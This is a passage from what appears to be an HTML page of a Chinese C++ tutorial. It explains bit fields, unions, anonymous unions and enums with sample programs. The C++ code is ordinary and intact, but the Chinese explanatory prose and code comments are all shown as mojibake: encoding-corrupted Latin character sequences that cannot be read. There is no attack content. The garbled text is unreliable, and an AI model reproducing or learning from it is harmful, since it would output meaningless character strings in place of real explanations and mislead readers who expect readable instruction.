ç¼–è¯‘å™¨å’Œå¹³å°è€Œå¼‚ï¼Œå› æ­¤åœ¨éœ€è¦è·¨å¹³å°å…¼å®¹æ€§çš„ä»£ç ä¸­åº”è°¨æ…ä½¿ç”¨ã€‚</li><li>  <strong>å¤§å°é™åˆ¶:</strong> ä½æ•°ä¸èƒ½è¶…è¿‡å…¶åŸºç¡€ç±»å‹çš„ä½æ•°ï¼ˆä¾‹å¦‚ï¼Œ<code>unsigned int</code> çš„ä½å­—æ®µä¸èƒ½è¶…è¿‡ <code>int</code> çš„ä½æ•°ï¼‰ã€‚</li><li>  <strong>åŒ¿åä½å­—æ®µ:</strong> å¯ä»¥ä½¿ç”¨æœªå‘½åçš„ä½å­—æ®µæ¥å¡«å……æˆ–å¯¹é½ï¼Œä¾‹å¦‚ <code>unsigned int : 2;</code>ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡è®¾ç”¨äºæ§åˆ¶æŸä¸ªè®¾å¤‡çš„çŠ¶æ€</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceStatus</span> &#123;</span></span><br><span class="line">    <span class="comment">// æ‰“åŒ…åˆ°å•ä¸ªå­—èŠ‚ (å‡è®¾ unsigned int è‡³å°‘ 8 ä½)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> powerOn : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> errorFlag : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> channel : <span class="number">3</span>; <span class="comment">// å¯ä»¥è¡¨ç¤º 0-7</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> : <span class="number">3</span>;       <span class="comment">// å¡«å……æœªä½¿ç”¨çš„ 3 ä½ï¼Œä½¿æ€»å…± 8 ä½</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DeviceStatus status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®ä½å­—æ®µçš„å€¼</span></span><br><span class="line">    status.powerOn = <span class="number">1</span>;    <span class="comment">// è®¾å¤‡å¼€æœº</span></span><br><span class="line">    status.errorFlag = <span class="number">0</span>; <span class="comment">// æ— é”™è¯¯</span></span><br><span class="line">    status.channel = <span class="number">5</span>;   <span class="comment">// è®¾ç½®é€šé“ä¸º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–ä½å­—æ®µçš„å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device Status:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Power On: &quot;</span> &lt;&lt; status.powerOn &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Error Flag: &quot;</span> &lt;&lt; status.errorFlag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Channel: &quot;</span> &lt;&lt; status.channel &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½å­—æ®µé€šå¸¸æ‰“åŒ…å­˜å‚¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DeviceStatus struct: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DeviceStatus) &lt;&lt; <span class="string">&quot; byte(s)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// è¾“å‡ºé€šå¸¸æ˜¯ 1 æˆ– 4 (å–å†³äºç¼–è¯‘å™¨å¦‚ä½•å¯¹é½å’Œæ‰“åŒ…ï¼Œä»¥åŠ int çš„å¤§å°)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ç‰¹å®šæ ‡å¿—</span></span><br><span class="line">    <span class="keyword">if</span> (status.powerOn) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device is powered on.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸èƒ½è·å–ä½å­—æ®µåœ°å€</span></span><br><span class="line">    <span class="comment">// unsigned int* pPower = &amp;status.powerOn; // é”™è¯¯!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½å­—æ®µæ˜¯ä¸€ç§åº•å±‚å·¥å…·ï¼Œé€‚ç”¨äºç‰¹å®šåœºæ™¯ï¼Œä½†åœ¨å¸¸è§„åº”ç”¨ç¨‹åºå¼€å‘ä¸­ä¸å¸¸ç”¨ã€‚</p><h2 id="4-5-å…±ç”¨ä½“"><a href="#4-5-å…±ç”¨ä½“" class="headerlink" title="4.5 å…±ç”¨ä½“"></a>4.5 å…±ç”¨ä½“</h2><p><strong>å…±ç”¨ä½“ (Union)</strong> æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼Œå®ƒä¹Ÿå…è®¸åœ¨ä¸€ä¸ªç»“æ„ä¸­å­˜å‚¨ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œä½†ä¸ç»“æ„ä½“ (struct) ä¸åŒçš„æ˜¯ï¼Œå…±ç”¨ä½“çš„<strong>æ‰€æœ‰æˆå‘˜å…±äº«åŒä¸€å—å†…å­˜ç©ºé—´</strong>ã€‚</p><p><strong>æ ¸å¿ƒç‰¹ç‚¹:</strong></p><ul><li>  <strong>å†…å­˜å…±äº«:</strong> å…±ç”¨ä½“çš„å¤§å°ç”±å…¶<strong>æœ€å¤§</strong>çš„æˆå‘˜çš„å¤§å°å†³å®šã€‚æ‰€æœ‰æˆå‘˜éƒ½ä»ç›¸åŒçš„å†…å­˜åœ°å€å¼€å§‹å­˜å‚¨ã€‚</li><li>  <strong>åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªæˆå‘˜æœ‰æ•ˆ:</strong> åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä½ åªèƒ½æœ‰æ•ˆåœ°å­˜å‚¨å’Œä½¿ç”¨å…±ç”¨ä½“ä¸­çš„<strong>ä¸€ä¸ª</strong>æˆå‘˜çš„å€¼ã€‚å½“ä½ ç»™ä¸€ä¸ªæˆå‘˜èµ‹å€¼æ—¶ï¼Œå¯èƒ½ä¼šè¦†ç›–æ‰å…¶ä»–æˆå‘˜çš„æ•°æ®ã€‚</li><li>  <strong>èŠ‚çœå†…å­˜:</strong> å½“ä½ éœ€è¦å­˜å‚¨å¤šç§ç±»å‹çš„æ•°æ®ï¼Œä½†çŸ¥é“åœ¨ä»»ä½•æ—¶å€™åªéœ€è¦ç”¨åˆ°å…¶ä¸­ä¸€ç§æ—¶ï¼Œå…±ç”¨ä½“å¯ä»¥èŠ‚çœå†…å­˜ï¼Œå› ä¸ºå®ƒåªéœ€è¦åˆ†é…è¶³å¤Ÿå®¹çº³æœ€å¤§æˆå‘˜çš„ç©ºé—´ã€‚</li></ul><p><strong>å®šä¹‰å…±ç”¨ä½“:</strong></p><p>ä½¿ç”¨ <code>union</code> å…³é”®å­—å®šä¹‰ï¼Œè¯­æ³•ä¸ <code>struct</code> ç±»ä¼¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">UnionName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// æ³¨æ„å®šä¹‰æœ«å°¾çš„åˆ†å·</span></span><br></pre></td></tr></table></figure><p><strong>è®¿é—®æˆå‘˜:</strong></p><p>ä¸ç»“æ„ä½“ä¸€æ ·ï¼Œä½¿ç”¨<strong>æˆå‘˜è¿ç®—ç¬¦</strong>ï¼ˆç‚¹è¿ç®—ç¬¦ <code>.</code>) æ¥è®¿é—®å…±ç”¨ä½“å˜é‡çš„æˆå‘˜ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªå…±ç”¨ä½“ï¼Œå¯ä»¥å­˜å‚¨ int, long æˆ– double</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">DataValue</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i_val;</span><br><span class="line">    <span class="keyword">long</span> l_val;</span><br><span class="line">    <span class="keyword">double</span> d_val;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DataValue data; <span class="comment">// å£°æ˜ä¸€ä¸ª DataValue å…±ç”¨ä½“å˜é‡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DataValue union: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DataValue) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// è¾“å‡ºçš„å¤§å°é€šå¸¸ç­‰äº sizeof(double)ï¼Œå› ä¸ºå®ƒæ˜¯æœ€å¤§çš„æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨å¹¶ä½¿ç”¨ int æˆå‘˜</span></span><br><span class="line">    data.i_val = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as int: &quot;</span> &lt;&lt; data.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// æ­¤æ—¶è®¿é—® l_val æˆ– d_val çš„ç»“æœæ˜¯æœªå®šä¹‰çš„/æ— æ„ä¹‰çš„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨å¹¶ä½¿ç”¨ double æˆå‘˜ (ä¼šè¦†ç›–ä¹‹å‰çš„ int å€¼)</span></span><br><span class="line">    data.d_val = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as double: &quot;</span> &lt;&lt; data.d_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// æ­¤æ—¶è®¿é—® i_val æˆ– l_val çš„ç»“æœæ˜¯æœªå®šä¹‰çš„/æ— æ„ä¹‰çš„</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // ç»“æœä¸å¯é </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨å¹¶ä½¿ç”¨ long æˆå‘˜ (ä¼šè¦†ç›–ä¹‹å‰çš„ double å€¼)</span></span><br><span class="line">    data.l_val = <span class="number">1234567890L</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as long: &quot;</span> &lt;&lt; data.l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- è¿½è¸ªå½“å‰æœ‰æ•ˆæˆå‘˜ ---</span></span><br><span class="line">    <span class="comment">// é€šå¸¸éœ€è¦ä¸€ä¸ªé¢å¤–çš„å˜é‡æ¥è®°å½•å½“å‰å“ªä¸ªæˆå‘˜æ˜¯æœ‰æ•ˆçš„</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">DataType</span> &#123;</span> INT, LONG, DOUBLE &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DataPacket</span> &#123;</span></span><br><span class="line">        DataType type; <span class="comment">// è®°å½•å½“å‰å­˜å‚¨çš„æ•°æ®ç±»å‹</span></span><br><span class="line">        DataValue value; <span class="comment">// å…±ç”¨ä½“å­˜å‚¨å®é™…å€¼</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    DataPacket packet;</span><br><span class="line">    packet.type = INT;</span><br><span class="line">    packet.value.i_val = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®ç±»å‹è®¿é—®</span></span><br><span class="line">    <span class="keyword">if</span> (packet.type == INT) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Packet contains int: &quot;</span> &lt;&lt; packet.value.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// ... å…¶ä»–ç±»å‹çš„æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é‡è¦:</strong> ç¨‹åºå‘˜æœ‰è´£ä»»è·Ÿè¸ªå…±ç”¨ä½“ä¸­å½“å‰å“ªä¸ªæˆå‘˜æ˜¯æ´»åŠ¨çš„ï¼ˆæœ‰æ•ˆçš„ï¼‰ã€‚è¯»å–éæ´»åŠ¨æˆå‘˜çš„å€¼ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºæˆ–å¾—åˆ°æ— æ„ä¹‰çš„æ•°æ®ã€‚é€šå¸¸ä¼šç»“åˆä¸€ä¸ªæšä¸¾ç±»å‹æˆ–æ•´æ•°æ ‡å¿—æ¥æŒ‡ç¤ºå½“å‰å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼Œå¦‚ <code>DataPacket</code> ç¤ºä¾‹æ‰€ç¤ºã€‚</p><p><strong>åŒ¿åå…±ç”¨ä½“ (Anonymous Union):</strong></p><p>å…±ç”¨ä½“å¯ä»¥ä¸å¸¦åç§°ç›´æ¥å®šä¹‰åœ¨ç»“æ„ä½“æˆ–ç±»å†…éƒ¨ï¼ˆæˆ–å‡½æ•°å±€éƒ¨ä½œç”¨åŸŸï¼‰ã€‚åŒ¿åå…±ç”¨ä½“çš„æˆå‘˜å¯ä»¥ç›´æ¥é€šè¿‡ç»“æ„/ç±»å˜é‡è®¿é—®ï¼Œå°±åƒå®ƒä»¬æ˜¯ç»“æ„/ç±»çš„ç›´æ¥æˆå‘˜ä¸€æ ·ã€‚åŒ¿åå…±ç”¨ä½“çš„æ‰€æœ‰æˆå‘˜ä»ç„¶å…±äº«ç›¸åŒçš„å†…å­˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type; <span class="comment">// &#x27;I&#x27; for integer, &#x27;F&#x27; for float</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">// åŒ¿åå…±ç”¨ä½“</span></span><br><span class="line">        <span class="keyword">int</span> intVal;</span><br><span class="line">        <span class="keyword">float</span> floatVal;</span><br><span class="line">    &#125;; <span class="comment">// æ³¨æ„è¿™é‡Œæ²¡æœ‰å˜é‡å</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Widget w;</span><br><span class="line">    w.type = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">    w.intVal = <span class="number">123</span>; <span class="comment">// ç›´æ¥è®¿é—®åŒ¿åå…±ç”¨ä½“çš„æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (w.type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Widget value (int): &quot;</span> &lt;&lt; w.intVal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (w.type == <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// w.floatVal = 3.14f; // å¦‚æœè¦å­˜ float</span></span><br><span class="line">        <span class="comment">// std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of Widget: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(Widget) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// å¤§å°é€šå¸¸æ˜¯ char çš„å¤§å° + æœ€å¤§æˆå‘˜(int æˆ– float)çš„å¤§å° + å¯èƒ½çš„å¯¹é½å¡«å……</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨åœºæ™¯:</strong></p><ul><li>  <strong>èŠ‚çœå†…å­˜:</strong> å½“æ•°æ®é¡¹æœ‰å¤šç§å¯èƒ½ç±»å‹ï¼Œä½†ä¸€æ¬¡åªä½¿ç”¨ä¸€ç§æ—¶ã€‚</li><li>  <strong>ç±»å‹åŒå…³ (Type Punning):</strong> ä»¥ä¸åŒçš„ç±»å‹è§£é‡ŠåŒä¸€å—å†…å­˜åŒºåŸŸï¼ˆä¾‹å¦‚ï¼Œå°†ä¸€ä¸ª <code>float</code> çš„ä½æ¨¡å¼è§£é‡Šä¸ºä¸€ä¸ª <code>int</code>ï¼‰ã€‚è¿™æ˜¯ä¸€ç§ä½çº§æŠ€å·§ï¼Œé€šå¸¸ä¸å¯ç§»æ¤ä¸”å¯èƒ½è¿å C++ çš„ä¸¥æ ¼åˆ«åè§„åˆ™ (strict aliasing rules)ï¼Œåº”è°¨æ…ä½¿ç”¨æˆ–é¿å…ã€‚</li></ul><p><strong>ä¸ç»“æ„çš„æ¯”è¾ƒ:</strong></p><ul><li>  <strong>å†…å­˜:</strong> ç»“æ„çš„æ‰€æœ‰æˆå‘˜éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜åœ°å€ï¼›å…±ç”¨ä½“çš„æ‰€æœ‰æˆå‘˜å…±äº«èµ·å§‹åœ°å€ã€‚</li><li>  <strong>å¤§å°:</strong> ç»“æ„çš„å¤§å°çº¦ç­‰äºå…¶æ‰€æœ‰æˆå‘˜å¤§å°ä¹‹å’Œï¼ˆåŠ ä¸Šå¯èƒ½çš„å¯¹é½å¡«å……ï¼‰ï¼›å…±ç”¨ä½“çš„å¤§å°ç­‰äºå…¶æœ€å¤§æˆå‘˜çš„å¤§å°ã€‚</li><li>  <strong>æœ‰æ•ˆæ€§:</strong> ç»“æ„çš„æ‰€æœ‰æˆå‘˜å¯ä»¥åŒæ—¶æœ‰æ•ˆï¼›å…±ç”¨ä½“åªæœ‰ä¸€ä¸ªæˆå‘˜èƒ½åŒæ—¶æœ‰æ•ˆã€‚</li></ul><p><strong>C++11 åŠä»¥åçš„å…±ç”¨ä½“:</strong></p><p>C++11 æ”¾å®½äº†å¯¹å…±ç”¨ä½“æˆå‘˜ç±»å‹çš„é™åˆ¶ï¼Œå…è®¸åŒ…å«å…·æœ‰éå¹³å‡¡æ„é€ å‡½æ•°ã€ææ„å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦çš„ç±»ç±»å‹æˆå‘˜ï¼ˆå¦‚ <code>std::string</code>ï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœå…±ç”¨ä½“åŒ…å«è¿™æ ·çš„æˆå‘˜ï¼Œç¼–è¯‘å™¨<strong>ä¸ä¼š</strong>è‡ªåŠ¨ç”Ÿæˆé»˜è®¤çš„æ„é€ å‡½æ•°ã€ææ„å‡½æ•°æˆ–å¤åˆ¶/ç§»åŠ¨æ“ä½œã€‚ç¨‹åºå‘˜å¿…é¡»<strong>æ‰‹åŠ¨ç®¡ç†</strong>è¿™äº›æˆå‘˜çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ placement new åœ¨å…±ç”¨ä½“å†…å­˜ä¸Šæ„é€ å¯¹è±¡ï¼Œå¹¶åœ¨ä¸å†éœ€è¦æ—¶æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°ï¼‰ã€‚è¿™ä½¿å¾—åŒ…å«å¤æ‚ç±»å‹çš„å…±ç”¨ä½“ä½¿ç”¨èµ·æ¥æ›´åŠ å¤æ‚å’Œæ˜“é”™ã€‚å¯¹äºåªåŒ…å« POD (Plain Old Data) ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>float</code>, æŒ‡é’ˆ, C é£æ ¼æ•°ç»„/ç»“æ„ï¼‰çš„å…±ç”¨ä½“ï¼Œå…¶è¡Œä¸ºä¸ C è¯­è¨€ä¸­ç±»ä¼¼ã€‚</p><h2 id="4-6-æšä¸¾"><a href="#4-6-æšä¸¾" class="headerlink" title="4.6 æšä¸¾"></a>4.6 æšä¸¾</h2><p>C++ çš„ <code>enum</code> å·¥å…·æä¾›äº†ä¸€ç§åˆ›å»º<strong>ç¬¦å·å¸¸é‡ (Symbolic Constant)</strong> çš„æ–¹å¼ï¼Œå¸¸ç”¨äºå®šä¹‰ä¸€ç»„ç›¸å…³çš„ã€å…·æœ‰åç§°çš„æ•´æ•°å¸¸é‡ã€‚è¿™æ¯”ä½¿ç”¨ <code>const int</code> æˆ– <code>#define</code> æ¥å®šä¹‰ä¸€ç»„ç›¸å…³å¸¸é‡æ›´æ–¹ä¾¿ã€æ›´å…·å¯è¯»æ€§ã€‚</p><p><strong>åŸºæœ¬æ¦‚å¿µ:</strong></p><ul><li>  <strong>æšä¸¾ç±»å‹ (Enumeration Type):</strong> <code>enum</code> å…³é”®å­—ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å®šä¹‰çš„æ•´æ•°ç±»å‹ã€‚</li><li>  <strong>æšä¸¾é‡ (Enumerator):</strong> åœ¨æšä¸¾ç±»å‹å®šä¹‰ä¸­åˆ—å‡ºçš„æ ‡è¯†ç¬¦ã€‚å®ƒä»¬æ˜¯å…·åçš„å¸¸é‡ï¼Œä»£è¡¨æ•´æ•°å€¼ã€‚</li></ul><p><strong>å®šä¹‰æšä¸¾:</strong></p><p>ä½¿ç”¨ <code>enum</code> å…³é”®å­—ï¼Œåè·Ÿæšä¸¾ç±»å‹çš„åç§°ï¼Œç„¶ååœ¨èŠ±æ‹¬å· <code>&#123;&#125;</code> å†…åˆ—å‡ºæšä¸¾é‡ï¼Œç”¨é€—å·åˆ†éš”ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;</span><br></pre></td></tr></table></figure><p><strong>å·¥ä½œåŸç†:</strong></p><ol><li> <strong>åˆ›å»ºæ–°ç±»å‹:</strong> ä¸Šè¿°è¯­å¥åˆ›å»ºäº†ä¸€ä¸ªåä¸º <code>spectrum</code> çš„æ–°ç±»å‹ã€‚</li><li> <strong>å®šä¹‰æšä¸¾é‡:</strong> <code>red</code>, <code>orange</code>, <code>yellow</code> ç­‰æˆä¸º <code>spectrum</code> ç±»å‹çš„ç¬¦å·å¸¸é‡ã€‚</li><li><strong>è‡ªåŠ¨èµ‹å€¼:</strong> é»˜è®¤æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å°†æ•´æ•°å€¼èµ‹ç»™æšä¸¾é‡ï¼Œä» 0 å¼€å§‹ï¼Œä¾æ¬¡é€’å¢ 1ã€‚<ul><li>  <code>red</code> å€¼ä¸º 0</li><li>  <code>orange</code> å€¼ä¸º 1</li><li>  <code>yellow</code> å€¼ä¸º 2</li><li>  â€¦</li><li>  <code>ultraviolet</code> å€¼ä¸º 7</li></ul></li></ol><p><strong>å£°æ˜å’Œä½¿ç”¨æšä¸¾å˜é‡:</strong></p><p>å¯ä»¥åƒä½¿ç”¨å…¶ä»–ç±»å‹ä¸€æ ·å£°æ˜æšä¸¾ç±»å‹çš„å˜é‡ã€‚æšä¸¾å˜é‡é€šå¸¸åªèƒ½è¢«èµ‹äºˆè¯¥æšä¸¾ç±»å‹ä¸­å®šä¹‰çš„æšä¸¾é‡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, 